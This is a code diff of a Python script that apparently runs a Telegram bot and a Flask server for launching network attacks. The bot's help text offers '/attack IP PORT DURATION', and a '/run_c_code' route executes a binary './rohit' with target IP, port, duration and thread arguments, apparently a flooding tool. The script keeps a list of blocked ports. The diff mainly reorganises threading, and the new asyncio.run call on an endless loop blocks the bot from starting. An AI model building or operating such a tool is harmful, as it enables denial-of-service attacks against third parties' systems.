@@ -22,9 +22,19 @@ logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s
 REQUEST_INTERVAL = 1
 blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
 
-# Asyncio loop
-loop = asyncio.get_event_loop()
+# Flask app
+app = Flask(__name__)
 
+@app.route('/')
+def hello_world():
+    return "Hello, World!"
+
+@app.route('/run_c_code')
+def run_c_code():
+    result = subprocess.run(["./rohit", "192.168.0.1", "12345", "60", "4"], capture_output=True, text=True)
+    return result.stdout
+
+# Asyncio loop
 async def start_asyncio_loop():
     while True:
         await asyncio.sleep(REQUEST_INTERVAL)
@@ -80,30 +90,17 @@ def process_attack_command(message):
 
     except Exception as e:
         logging.error(f"Error in processing attack command: {e}")
+        bot.send_message(message.chat.id, "An error occurred while processing your request.", parse_mode='Markdown')
 
 @bot.message_handler(commands=['help'])
 def help_command(message):
     bot.send_message(message.chat.id, "Use `/attack IP PORT DURATION` to launch an attack. `/help` for assistance.", parse_mode='Markdown')
 
-# Flask app
-app = Flask(__name__)
+# Thread Runner
+def run_flask():
+    app.run(host="0.0.0.0", port=5000)
 
-@app.route('/')
-def hello_world():
-    return "Hello, World!"
-
-@app.route('/run_c_code')
-def run_c_code():
-    result = subprocess.run(["./rohit", "192.168.0.1", "12345", "60", "4"], capture_output=True, text=True)
-    return result.stdout
-
-if __name__ == '__main__':
-    asyncio_thread = Thread(target=start_asyncio_loop, daemon=True)
-    asyncio_thread.start()
-
-    flask_thread = Thread(target=app.run, host="0.0.0.0", port=5000, daemon=True)
-    flask_thread.start()
-
+def run_telegram_bot():
     logging.info("Starting Telegram bot...")
     while True:
         try:
@@ -111,3 +108,12 @@ if __name__ == '__main__':
         except Exception as e:
             logging.error(f"An error occurred while polling: {e}")
         time.sleep(REQUEST_INTERVAL)
+
+if __name__ == '__main__':
+    # Start Flask server in a separate thread
+    flask_thread = Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+
+    # Start Telegram bot
+    asyncio.run(start_asyncio_loop())
+    run_telegram_bot()
